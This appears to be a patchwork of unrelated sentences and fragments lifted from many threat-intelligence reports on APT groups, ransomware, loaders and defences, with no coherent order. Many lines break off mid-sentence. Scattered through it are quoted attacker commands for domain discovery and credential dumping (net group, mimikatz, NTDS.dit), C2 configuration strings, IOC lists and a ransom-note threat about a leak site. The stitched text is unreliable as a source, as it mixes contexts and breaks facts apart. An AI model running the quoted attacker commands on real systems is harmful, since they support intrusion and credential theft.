With these capabilities, Microsoft 365 Defender customers using Microsoft Defender for IoT have visibility into security recommendations for devices with the following vulnerabilities: CVE-2014-8361 CVE-2019-10655 CVE-2020-25506 CVE-2021-36260 CVE-2021-42013 CVE-2022-30525 CVE-2022-31137 CVE-2022-37061 Devices with these vulnerabilities are also visible in the Microsoft Defender Vulnerability Management inventory. 
Service Name: Mesh AgentService File Name: "C:\Program Files\Mesh Agent\MeshAgent.exe"Service Type: user mode serviceService Start Type: auto startService Account:
These files are all self-deleted after launch or full installation of the attacker configuration.
S1053 AvosLocker
Why?
Custom implementation of murmur hash The malware employs dynamic API resolving to conceal its API imports and make static analysis more difficult.
Dropper Variant A related group of dropper variants was also identified (e.g., 27158886ab064880aa5d5196248f2ad4b20b38bbb1321f72bca17351165ea3e5).
The addition of a few benign-looking lines of code into a single DLL file spelled a serious threat to organizations using the affected product, a widely used IT administration software used across verticals, including government and the security industry.
By actively targeting high-profile experts in North Korean affairs and stealing subscription credentials from prominent news and analysis outlets focussing on North Korea, Kimsuky demonstrates a heightened curiosity in understanding how the international community perceives developments concerning North Korea, such as the country’s military activities.
S0188 Starloader
RathbuigeServiceMainSvchostPushServiceGlobals The samples also contain a DllEntryPoint, should the DLL be executed without specifying an export.
[T1053.005] that executed daily as .
Pacha and Rocke were subsequently involved in a documented crypto war, which has lasted nearly two years.
Refrain from opening untrusted links and email attachments without first verifying their authenticity. 
DC4.exe DC4.exe is a small, UPX-packed password protected binary that generates and executes an embedded batch file.
While Conti (ranked second) has been around in various guises for almost two years, it is surrounded at the top of the chart by emerging families.
[MITRE ATT&CK] Domain Fronting (T1172) ZDI-CAN-6135: A Remote Code Execution Vulnerability In The Microsoft Windows JET Database Engine (September 20, 2018) 
Protect Credentials Strengthen credential requirements, regularly change passwords, and implement multi-factor authentication to protect individual accounts, particularly for webmail and VPN access and for accounts that access critical systems.
The contents are saved to /tmp/._[a-zA-Z]{10}/Logic Pro X.app/Contents/MacOS/Logic Pro X.
[D3-JFAPA] Process Analysis Database Query String Analysis
Interestingly, several of its other subdomains are mentioned in an FBI report.
Loading a configuration file by BADCALL for Linux, cf.
Due to its relatively large size, certain antivirus may choose not to analyze it, potentially bypassing detection.
PE Injection Common injection methods used by banking Trojans involve writing a mapped PE into a remote process using WriteProcessMemory.
The subsequent functions collect additional information such as the machine’s public IP address, domain trust information and the computer architecture.
At one customer, the data of interest was stored in a separate security zone.
S0244 Comnie
On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.
[SNDCAB]CABHOST=C2CABPORT=80CABPAGE=/upload.phpCABPATH=c:\cab The use of this module indicates a change in the group’s operation structure, since in the previous version, the collected information was sent to a server whose address was hardcoded into the stealer code, and the module used the same protocol as the backdoor.
From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC).
Structure of obfuscated codeIn addition, to obfuscate the control flow in the code, conditional jumps that never run are included as well: cmp esp, 3181h jb loc_1000BCA9 The obfuscated code is the loader for the subsequent shellcode, which is encrypted in the file log.dll.dat.
In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database.
TLS_SOCKETContinuously sends random payloads on an open TLS socket.
The MFT holds the information of where each fragment is stored.
Uninstall the Pre-Validator. 0x7502A0 Disconnect from the C2 server. 
The attackers not only execute ransomware but also exfiltrate sensitive data and threaten to release it publicly if the ransom demands are not met.
The attacker submitted the email from "info[@]stoneworkers[.]org" while posing as "jpeterman[@]stoneworkers[.]org".
Account Manipulation Added newly created accounts to the administrators' group to maintain elevated access. T1543.003.
Discovery Technique Title ID Use Recommendations Remote System Discovery T1018 
APT actors have relied on multiple avenues for initial access.
Finally, the computed SHA512 hash of the shared secret is used to construct the KEY and IV for the eSTREAM cipher hc-128. 
The phishing email came with no pretext from a site not used by the client.
In the list below we have highlighted a few specific tools the adversary used for discovery purposes.
StartTime, EndTime, and WeekDays restrict the times and days when the backdoor may function The <Config> element may contain an arbitrary number of elements describing various types of connectors: TcpConnector and TcpBindConnector are classes responsible for connecting over TCP as client and server. 
The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.
After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs. 
S0667 Chrommme
Figure 1: Example of tactics and techniques used in various cyber operations. 
Detect: Platform Monitoring Operating System Monitoring System File Analysis
These encrypted strings, once decrypted, contained the C2 domains for additional malicious artifacts.
Attackers using wipers do not usually target financial reward but intend to disrupt the victim’s operations as much as possible.
The decompression function is shown in Figure 24. Figure 24: APLib decompression function To be able to locate the embedded compressed binaries, we need to find the structure of the ISFB payload where it stores the configuration.
The email subject and body use terms and themes that would be familiar with the recipients in governmental and energy sectors, such as International Atomic Energy Agency (IAEA), China Institute of International Studies (CIIS), strategic alliances, and nuclear doctrines. 
Only this time, the resulting bytes are further decoded with xor 82.
Suricata Flow log from "Subsidiary PIE" to the IP resolved for “Rclone”.
Indicators of compromise Downloader 087407551649376d90d1743bac75aac8 regsile.exe Cur1Agent downloader f766f97eb213d81bf15c02d4681c50a4 61a227bf4c5c1514f5cbd2f37d98ef5b 4c0fb06320d1b7ecf44ffd0442fc10ed d8f6290517c114e73e03ab30165098f6 Loader d3503e87df528ce3b07ca6d94d1ba9fc E:\Readme.exe 931d0969654af3f77fc1dab9e2bd66b1 Job_Description. 
The script has an email address format validation function that compares all of the extracted email addresses with a regular expression.
Figure 2.
With both wiper and ransomware attacks, the victim depends on their back up system to recover after an attack.
Additionally, LockBit 2.0 has affected many companies globally, with top victims based in the U.S., Italy and Germany.
Both initial compromised hosts were in the Construction environment.
{ meta: description = "15184_ - file 17jun.exe" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1" strings: $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii $x2 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125ERROR: unable to download agent fromGo pointer stored in" ascii $x3 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETCent" ascii $x4 = "slice bounds out of range [:
SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.
In this specific campaign, security researchers observed that the threat actor used a variant of Shamoon to encrypt data.
NT hashes for all the accounts on the local machine, including the local administrator credential hash, are stored in the SAM database.
Monitor for policy changes to authentication mechanisms used by the domain controller. 
In both cases, a configuration block containing a pipe-delimited list of IP addresses is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config. 
/c net group domain admins /domain
The client, in turn, ignores certificate validation. 
On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment. 
It uses a global flag PRIV_FLAG to track the extent of privileges the malware is able to obtain. 
Contributors We would like to thank Teoderick Contreras for authoring this post and the entire Splunk Threat Research Team for their contributions: Michael Haag, Mauricio Velazco, Lou Stella, Bhavin Patel, Rod Soto, Eric McGinnis, and Patrick Bareiss. 
Mandiant has yet to observe PRIVATELOG or STASHLOG in any customer environments or to recover any second-stage payloads launched by PRIVATELOG.
A sample of a scanning run is displayed below: Host Process ID Process Name Command Line Yara Rule SERVERA 568 winlogon.exe winlogon.exe win_cobalt_strike_auto SERVERA 4284 RuntimeBroker.exe C:\Windows\System32\RuntimeBroker.exe -Embedding win_cobalt_strike_auto SERVERB 9936 
This cyber espionage activity is happening against the backdrop of China’s multi-billion-dollar investments related to the Belt and Road Initiative (BRI) and its interest in Israeli’s robust technology sector. 
We were unable to determine the purpose of these packets. 
Its configuration contains two C2 servers: update.upgradsource[.]com and ns.upgradsource[.]com. 
A list of IOCs is also available in the HP Threat Research GitHub repository. 
G0031 Dust Storm
Ensure that User-ID is only enabled for internal trusted interfaces Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone CORTEX XDR PREVENT Configure Restrictions Security Profile Persistence, Privilege Escalation, Defense Evasion 
Available: https://github.com/shmilylty/OneForAll (accessed: Apr. 26, 2023). 
When we mapped out all of these, we believed that one of the two previously mentioned groups were responsible for the campaign we investigated. 
There were several variants of Mimikatz in binary and PowerShell form: "C:\ProgramData\mimikatz.exe" "C:\ProgramData\mimikatz.exe.exe" "C:\ProgramData\mimikatz_cryptovanniy.exe" "C:\ProgramData\notepad.exe" "C:\ProgramData\katz.ps1 Commands used to collect credentials and export to text files stored in the C:\ProgramData folder included the following: C:\Windows\system32\cmd.exe /C
Azure AD Connect is an on-premises application for managing hybrid identities through features like password hash synchronization, pass-through authentication, objects synchronization, and others.
The decrypted data consists of a 4 byte size, followed by a single byte indicating either a command or the load method that the malware should use for the payload, followed by the payload data itself, if applicable. 
<current_date>Account discoverymsadcs.exe “NTDS.dit” -s
McAfee Endpoint Threat Prevention Events Ransom-NetW!AB8D59ABA3DC GenericRXKU-HO!E33E060DA1A5 PS/Netwalker.a Ransom-NetW!1B6A2BFA39BC Artemis!2F96F8098A29 GenericRXKD-DA!645C720FF0EB GenericRXKD-DA!4E59FBA21C5E Ransom-NetW!A9E395E478D0 Ransom-NetW!A0BC1AFED896 PS/Netwalker.c Artemis!F5C877335920 GenericRXKD-DA!B862EBC24355 Artemis!2F96F8098A29 GenericRXKD-DA!63EB7712D7C9 RDN/Ransom GenericRXKD-DA!F0CC568491CD Artemis!0FF0D5085F7E GenericRXKD-DA!9172586C2F87 RDN/Generic.dx Ransom-NetW!BFF6F7B3A7DB Ransom-NetW!7B77B436360A GenericRXKD-DA!BC75859695F6 GenericRXKD-DA!FCEDEA8111AB GenericRXKD-DA!5ABF6ED342FD PS/Netwalker.d GenericRXKD-DA!C0DDA75C6EAE GenericRXKD-DA!ADDC865F6169 GenericRXKD-DA!DBDD7A1F53AA Artemis!1527DAF8626C GenericRXKD-DA!608AC26EA80C Ransom-NetW!3A601EE68000 GenericRXKD-DA!8102821249E1 Ransom-NetW!2E2F5FE8ABA4 GenericRXKD-DA!F957F19CD9D7 GenericRXKD-DA!3F3CC36F4298 GenericRXKD-DA!9001DFA8D69D PS/Agent.bu GenericRXKD-DA!5F55AC3DD189 GenericRXKD-DA!18C32583A6FE GenericRXKD-DA!01F703234047 Ransom-NetW!62C71449FBAA GenericRXKD-DA!6A64553DA499 GenericRXKD-DA!0CBA10DF0C89 Artemis!50C6B1B805EC PS/Netwalker.b GenericRXKD-DA!59B00F607A75 Artemis!BC96C744BD66 GenericRXKD-DA!DE0B8566636D Ransom-NetW!8E310318B1B5 GenericRXKD-DA!0537D845BA09 GenericRXKU-HO!DE61B852CADA GenericRXKD-DA!B4F8572D4500 PS/Netwalker.c GenericRXKD-DA!D09CFDA29F17 PS/Agent.bx GenericRXKD-DA!0FF5949ED496 GenericRXKD-DA!2B0384BE06D2 GenericRXKD-DA!5CE75526A25C GenericRXKD-DA!BDC345B7BCEC Ransom-CWall!993B73D6490B GenericRXKD-DA!0E611C6FA27A GenericRXKU-HO!961942A472C2 Ransom-NetW!291E1CE9CD3E Ransom-Mailto!D60D91C24570 PS/Agent.bu GenericRXKU-HO!997F0EC7FCFA PS/Agent.bx Ransom-CWall!3D6203DF53FC Ransom-Netwalker Ransom-NetW!BDE3EC20E9F8 Generic .kk GenericRXKU-HO!1DB8C7DEA2F7 GenericRXKD-DA!DD4F9213BA67 GenericRXKD-DA!729928E6FD6A GenericRXKU-HO!9FB87AC9C00E GenericRXKU-HO!187417F65AFB PS/Netwalker.b McAfee Web Gateway Events RDN/Ransom BehavesLike.Win32.RansomCWall.mh BehavesLike.Win32.Generic.kh Ransom-NetW!1B6A2BFA39BC BehavesLike.Win32.MultiPlug.kh Ransom:Win32/NetWalker.
Sample Analysis RokRAT has been previously analyzed as having a multi-stage process with two components.
.rtf 
On March 30th, Joe Desimone, a security researcher from Elastic Security, was among the first to provide, in a Twitter thread, substantial clues that the 3CX-driven compromises are probably linked to Lazarus.
Fig.5 Decrypted payload The decrypted payload that is going to be executed contains another embedded DLL as shown below.
S0022 Uroburos
Figure 8 OneNote directory in Temp By analyzing numerous malicious documents, we have been able to create a “test” OneNote document that executes a batch file that contains the “whoami” command.
Indicators of Compromise (IOCs) 
net group /domain
Researchers at Tenable Research discovered two vulnerabilities in monitoring and surveillance company NUUO’s “Network Video Recorder” software in the “NVRMini2” network-connected, video recording device.
Click here for Anomali recommendation BusyGasper – The Unfriendly Spy (August 29, 2018) Security researchers from Kaspersky Lab uncovered a new family of spyware, dubbed “BusyGasper,” that targets Android devices.
S0178 Truvasys
Threat actors use SMB to propagate malware across organizations. 
It will then boot the system in safe mode and proceed to encrypt files.
Figure 1: Attack flow described in this research Social Engineering with Phishing Emails The emails contain a number of social engineering techniques.
T1003.001
Figure 5. .Net
Figure 2 – malicious document Upon opening the malicious document, it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack.
In cases where Mint Sandstorm operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains. 
0x10 File size again. 
The RTF file includes both an encrypted payload and shellcode.
Abusing cloud services to fly under the radar
This section will cover details of dropper script used to deploy QakBot.
This was produced manually as an example of an SSH connection while SSH was running on the emulated C2 host on port 2222.
S0161 XAgentOSX
The next section contains a technical description of the new Lazarus malicious Linux payload we recently analyzed, as well as how it helped us strengthen the existing link between Lazarus and the 3CX compromise. 
By harnessing the powerful capabilities of the AsyncSSH library, which provides an exceptional implementation of the SSHv2 protocol, this tool ensures efficient and secure communication between the attacker and the victim. 
SHA-256 Detection Description c0063d24f3de4e7b89abf9b690a3d264efc6ab7a626f73ad9f42d6bffe52bce7 Trojan.
The good news is that there are several lessons we can learn about this incident: Logging is critical for forensics — ensure there is reliable and secure logging infrastructure in place.
title: Pack it Secretly: Earth Preta’s Updated Stealthy Strategies url: https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html APT & Targeted Attacks Pack it Secretly: Earth Preta’s Updated Stealthy Strategies After months of investigation, we found that several undisclosed malware and interesting tools used for exfiltration purposes were being used by Earth Preta.
Man from offset 0x409 till last byte.
An Attacker with domain admin rights can gain access to the Domain Controller’s file system and acquire credentials like hashes, Kerberos tickets and other reversibly encrypted passwords of all the users joined in the domain by dumping and exfiltrating the Ntds.dit file.
On the other hand, it enables threat actors to abuse these frameworks to conduct attacks without developing or purchasing custom malware. 
We were able to extract the malicious installer script and files for analysis using 7-Zip.
S1059 metaMain
Conduct regular assessments to ensure appropriate procedures are created and can be followed by security staff and end users. 
From a detection standpoint, focus on identity and access management (IAM) rather than just network traffic or static host alerts. 
It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.]com, *.ngrok[.]io, ngrok.*.tunnel[.]com, or korgn.*.lennut[.]com. 
DiscoveryMultiple TA410 backdoors can list running processes. 
This proxy server is located on the I2P network at the destination of the pool tunnel. 
The team intended to use that connection to reverse tunnel traffic back to the workstation and then access the bastion host via the open SSH socket file.
OpenSource Gh0st RAT Still Haunting Inboxes 15 Years After Release
S0150 POSHSPY
The implementation of the ReconShark variant we observed in this activity remains the same as the one covered in our previous post on Kimsuky activity, with the main distinction being the use of a different C2 server: staradvertiser[.]store.
It invokes CryptGenKey to generate an AES-128 key.
[T1561.002] MitigationsCISA and FBI recommend think tank organizations apply the following critical practices to strengthen their security posture. 
Our analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try to acquire the path to the SQL Anywhere API library from the environment variable “SQLANY_API_DLL” and load it if it’s available. 
2.
Administrator accounts should have the minimum permission necessary to complete their tasks. 
Resolving API hashes The following is the list of decrypted library names: 
The adversary installs a hackers best friend during the intrusion: Cobalt Strike.
The location to which Sandals will write the batch file on the remote system.
Unlike the Standard IcedID Loader, there is no host information being exfiltrated within the request.
Rpcrt4_RpcStringFreeW 0xD2CD112 : advapi32_CreateWellKnownSid 0xEFBC2E9 : kernel32_LocalFree 0x60EDB01 : Rpcrt4_RpcBindingFree 0x7A7DAA0 : Rpcrt4_RpcAsyncInitializeHandle 0xB3F16FA : kernel32_CreateEventW 0x1C23B4F : Rpcrt4_NdrAsyncClientCall 0x8C1F37 : kernel32_WaitForSingleObject 0x7831640 : Rpcrt4_RpcRaiseException 0xF2FCCFE : Rpcrt4_RpcAsyncCompleteCall 0x816F545 : kernel32_SetLastError 0xFBE2D99 : oleaut32_SysAllocString 0x393ACB : oleaut32_SysFreeString 0xC9FEF5F : kernel32_ExpandEnvironmentStringsW 0x74D51D3 : kernel32_CreateProcessW 0xCDE9EC27 : wininet_HttpWebSocketClose 0x80C8449 : kernel32_TerminateProcess 0x418B4E7E : wininet_AppCacheCheckManifest 0x44E65EB : kernel32_WaitForDebugEvent 0x81C3F46 :
T1561.001Disk Wipe: Disk Content WipeFantasy wipes all disk contents from non-Windows drives that are fixed drives. 
This recent attack involved a network of single-tenant applications installed in compromised organizations being used as the actor’s identity platform to perform the attack.
Instead use more modern federation protocols (SAML, OIDC) or Kerberos for authentication with AES-256 bit encryption [CPG 3.4]. 
Depending on the system, the event with ID 8001 belongs to Microsoft Internet Information Services (IIS), Microsoft Exchange Server or Windows Server (Source: Netsurion EventTracker).
Other malleable profile rules include CobaltStrike Malformed UAs in Malleable Profiles, CobaltStrike Malleable (OCSP) Profile, and CobaltStrike Malleable OneDrive Browsing Traffic Profile. 
ADGet : An uncommon tool An Active Directory collection tool called ADGet was dropped into a user’s temp folder and executed with an output filename argument.
Chrome/84.0.4147.125
S0559 SUNBURST
Determine if certain categories of websites are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. 
In the former case, the task or service attains persistence by being set to start automatically on boot.
Finally, the extended information of the physical drives is destroyed, including the MBR and partition entries. 
Unsecured Credentials: Bash History T1552.003 The team found bash history files on a Workstation 5, and the files appeared to be SSH passwords saved in bash history. 
network configuration discoveryping -n
Based on the used malware, infrastructure, and tactics, we assess with high confidence that the campaign has been orchestrated by the Kimsuky threat actor. 
[START GHOST] 80CA9F179F1701039000002000800826435643FFFFFFFF900080AE80001D00000000010000000000000000760000008000098620060600B4E5C6EB80128000AA5EA486052A8886DE06050A03A4B8009000 
Click here for a PDF version of this report. 
Instead of searching for the function in the usual way, the malware makes a CRC32 hash of the name of each function and compares with hardcoded values.
Then it starts to write random data into the drives in chunks of 64 KB.
Fantasy then writes another batch file, %WINDOWS%\Temp\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.
PowerShellTechniqueT1059.001https://attack.mitre.org/techniques/T1059/001/Command and Scripting Interpreter:
They switched to C2 encapsulated in HTTPS in Q3 2019.
Win32.ToolPow.
Notably, this made the dynamic analysis of old samples difficult. 
, the adversary had a long-term intention to stay present in the victim’s network.
Once the attacker is authenticated with any domain user credentials and has information about the SPN values of the services within the domain, they can initiate the Kerberos Ticket Granting Service request (TGS – REQ) to the Key Distribution Server with the specified SPN value.
00000000`00000000
Samples of LEMURLOOT have been uploaded to public repositories from several additional countries—including Italy, Pakistan, and Germany—suggesting that UNC4857 has also impacted organizations in these nations. 
[TA0005]. 
Visual Basic Persistence T1098: Account Manipulation T1136: Create Account T1547.001:
This blog explains Cobalt Strike and practical steps to take if you believe that you are being targeted by Cobalt Strike or already compromised.
The attackers, in this case, seemed to limit their communication to email. 
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=
Create Account: Local Account [T1136.001] Account Manipulation [T1098] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Local Admin User Account Creation (server) Create a local administrator account on a target server system. 
The earlier variant is much more limited in functionality compared to the 2019 variant. 
This vulnerability is in all operating systems (macOS, Windows, and Linux), and have yet to see a patch. 
Camaro Dragon’s TinyNote Backdoor url: https://research.checkpoint.com/2023/malware-spotlight-camaro-dragons-tinynote-backdoor/ Executive summary Since early January 2023, there has been a notable surge in activity targeting European foreign affairs entities linked to Southeast and East Asia.
So, identifying the actions of a malicious actor before ransomware is deployed is crucial to preventing the attack.
NetWalker has noticeably evolved to a more stable and robust ransomware-as-a-service (RaaS) model, and McAfee research suggests that the malware operators are targeting and attracting a broader range of technically advanced and enterprising criminal affiliates.
Key Takeaways BatLoader delivers additional malware and tools including ISFB, Vidar Stealer, Cobalt Strike, Syncro RMM, and SystemBC RAT via fake installers.eSentire Threat Response Unit (TRU) observed two different BatLoader campaigns in 2022.BatLoader can evade most antivirus detections due to the size of the MSI installers.
| extend PermissionAddedTo = tostring(RawEventData.
As seen in the screenshot below, GetSystem creates a service and connects to a pipe. 
The trojan also has anti-analysis and anti-detection capabilities to evade the sandbox and virtual environments.
Enable firewall rules to block RDP traffic between network security zones within a network [M1030]. 
Employ user input validation to restrict exploitation of vulnerabilities. 
The ISO file format is typically used to package the contents of an optical disc.
Will be sold in one hand.
Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [DS0017]. 
In addition to refreshing the threat actor’s credentials, the threat actor would also refresh their understanding of the victim’s AD environment.
\\<host>\HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\ServersQuery registryreg query \\<host>\HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Internet
With the assistance of a third-party incident response firm and constant ongoing contact with the Quadrant team, the client was able to slowly, systematically, and safely bring their servers on-line while purging any remains of the threat actor over the course of the next two weeks. 
Figure 3.
Appendix A: Indicators of Compromise (IOCs) 
Discovery commands observed from other Cobalt Strike beacons using LOLBAS included: systeminfo netstat -anop tcp cmd.exe /C
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic.
T1497 Sandbox Evasion Vice Society attempts to thwart reverse engineering and/or dynamic analysis via various sandbox evasion techniques. 
Hello packet: - SSL Version - Accepted Ciphers - List of Extensions - Elliptic Curves - Elliptic Curve Formats For more information on how JA3 works, you can visit the official GitHub repository here: https://github.com/salesforce/ja3. 
Their approach highlights the group’s commitment to creating a sense of rapport with the individuals they target, potentially increasing the success rate of their subsequent malicious activities. 
S0378 PoshC2
To obtain them please visit our McAfee ATR GitHub site, or get the latest NetWalker IoCs and intelligence on many other threats with McAfee Insights. 
Victims can be lured into clicking executable content including binaries, scripts or shortcut files masquerading as benign filetypes such as PDFs or folders.
While the loader used with the first injection method is simple, the one invoked in case of APC injections is rather interesting.
TA0007 Discovery T1046.
For API Hashing the EnigmaDownloader_s001 uses the following custom MurmurHash: Figure 7.
These ads lead to webpages that eventually ask for personal information or try to download malware.
In August 2021, a Russian blogger published a 22-minute interview with an alleged representative of the group behind LockBit 2.0 called “LockBitSupp” on a YouTube channel called “Russian-language open source intelligence (OSINT).”
The script creates two other malicious batch scripts with the extension .cmd
By posing as authoritative entities or government agencies, the messages are intended to deceive unsuspecting individuals and get them to disclose their online banking credentials. 
We include this information to help defenders determine how far back systems might have been compromised. 
: Dates Observed RAT C2 11 Nov 2021 - 22 Nov 2021 Remcos 65.21.127.164[:]4449 14 Oct 2021 - 22 Oct 2021 BitRAT 135.181.6.215[:]7777 09 Sep 2021 - 14 Oct 2021 BitRAT 135.181.140.153[:]7777 24 Aug 2021 - 07 Sep 2021 BitRAT 135.181.140.182[:]7777 Technical Analysis of the Babadeda Crypter Figure 4: Execution flow diagram During our research, we found different variants of the same Crypter — all of which contain the same main execution flow (denoted by the figure above).
The DLL’s used were side-loaded in memory on compromised systems.
The specific payload that is downloaded varies depending on the link on the .NET downloader. 
Checkpoint Iran Says Gas Stations Were Target Of Cyberattack To Foment Unrest (iranintl.com) Complaint – Summons – Civil Cover Sheet.pdf (noticeofpleadings.com) 
Neither does a blogpost by Volexity, which even refrained from providing attribution, stating “Volexity cannot currently map the disclosed activity to any threat actor”.
Once the REvil configuration has decrypted, it utilizes the same JSON format, but contains additional values such as pid, sub, fast, wipe and dmn.
TA0011 Command and Control;T1071 Application Layer Protocol;Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS, DNS). ;T1105
Trendmicro noted changes to supported configurations in FOCUSFJORD, dubbed SysUpdate, in their 2020 and 2021 reports following public disclosures.
This function loads another PE, that is embedded inside as a base64 encoded buffer: Figure 20: Another buffer Figure 21: Deploying the payload This time the loader uses another method of PE injection, manual loading into the parent process. 
The Hider also protects plugins loaded by the Orchestrator. 
Client Details Form.doc Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts. 
The file is intended to store text to help Windows improve handwriting recognition so it recognises and accurately suggests corrections and/or words based on what a user uses frequently.
S0380 StoneDrill
McAfee protects its customers against the malware covered in this blog in all its products, including personal antivirus, endpoint and gateway.
Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time.
He observed that a shellcode stub prepended to the payload from d3dcompiler_47.dll is similar to AppleJeus loader stubs attributed to Lazarus by CISA back in April 2021. 
The stolen information is that set as fields in the URL parameter: C2 response—Facebook's graph API used to access sensitive information Extract victim’s sensitive Facebook data using the graph API and send the results to a C2 server dlAR Download and run.
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised. 
Victims of 8220 Gang are typically, but not exclusively, users of cloud networks operating vulnerable and misconfigured Linux applications and services. 
title: Warning: New attack campaign utilized a new 0-day RCE vulnerability on Microsoft Exchange Server url: https://www.gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html Circa the beginning of August 2022, while doing security monitoring & incident response services, GTSC SOC team discovered that a critical infrastructure was being attacked, specifically to their Microsoft Exchange application.
Below, we can see the results from one of our recent cases, BazarLoader and the Conti Leaks.
This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again. 
Figure 17.
We’ve seen the adversary staging data on a remote system or on the local system.
6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API "C:\Windows\System32\cmd.exe" /c
https://nvd.nist.gov/vuln/detail/CVE-2022-39197 (accessed Apr. 28, 2023). 
MyDoom Unpacked The packer decompresses and executes the actual MyDoom code.
S0493 GoldenSpy
In our case, they equal {56a36bd2-5e2b-20b0-96f2cb9bb3f43475} and EB5D1182, respectively. 
We observed the use of Cobalt Strike’s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.
In practice, standards have been developed for that purpose, see hash-to-curve.
On further investigation into the directories within the victim IP address, we found a web shell named x, (http[:]//victim-ip/x) with SHA256 de7994277a81cf48f575f7245ec782c82452bb928a55c7fae11c2702cc308b8b.
This enables the malware to carry out malicious activities on the system without difficulty, posing a significant risk to the system’s security. 
Figure 1: A screenshot of the recent phishing email used to deliver Gh0st RAT via an embedded link. 
It also has information-stealing capabilities, such as logging keystrokes via polling and application hooks, capturing screenshots, manipulating the victim’s machine clipboard and tracking the mouse's events.
The Appendix of this blog will provide an in-depth description of each data byte in the HTTP based C2 communication, detailing the specific purpose of each byte.
The sheer number of these mistakes might lead us to the conclusion that this attack was not the work of a state-sponsored actor and not an advanced persistent threat (APT). 
A known technique for evading detection is to patch the process entry point with a small jump that redirects execution to the payload without actually using NtGetContextThread/NtSetContextThread functions or unmapping the main image.
But the payload may be one and the same in all these cases.
When used without modification, it is quite easy to decompress the original executable using the tool itself. 
Figure 7 – Extracting DPAPI Master Key Malware also tends to use multiple variants of credential enumeration APIs available within Windows.
[WINDOWS-CLIPBOARD] rwinsta command 5008376 [WINDOWS-CLIPBOARD] nltest command 5008377 
In the past few years, Microsoft has observed that more and more threat actors, including nation-state actors, have been using OAuth applications for different malicious purposes – command-and-control (C2) communication, backdoors, phishing, redirections, and so on. 
Tactics, Techniques and Procedures Observed During Ransom Cartel Attacks Unit 42 observed a Ransom Cartel threat actor using a tool called DonPAPI, which has not been observed in past incidents.
G0027 Threat Group-3390
This feature can also be invoked on demand by the server. 
014421BDB1EA105A6DF0C27FC114819FF3637704hhh.exeWin32/Agent.
These cyber operations support China’s long-term economic and military development objectives. 
The PHP scripts are responsible for stealing and exfiltrating information.
When the new process starts up, the ProcessWorm will be loaded with the help of the APC injection loader. 
nslookup USERFirstName UserLastName Another example, the misspelling of administrators: net group administartors /domain 
However, performing "cat" or "strings" reveals the actual data.
Screen Capture
Implement a Domain-Based Message Authentication, Reporting & Conformance validation system. 
Configure time-based access for accounts set at the admin level and higher.
[T1484.001] THREAT PREVENTION Ensure a secure Vulnerability Protection Profile is applied to all security rules allowing traffic Ensure a Vulnerability Protection Profile is set to block attacks against critical and high vulnerabilities, and set to default on medium, low, and informational vulnerabilities Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the internet Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use CORTEX XSOAR Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint Deploy XSOAR Playbook - Block Account Generic Deploy XSOAR Playbook - Access Investigation Playbook Deploy XSOAR Playbook - Impossible Traveler NEXT-GENERATION FIREWALLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure that the User-ID service account does not have interactive logon rights Define at least one 'Include Network'. 
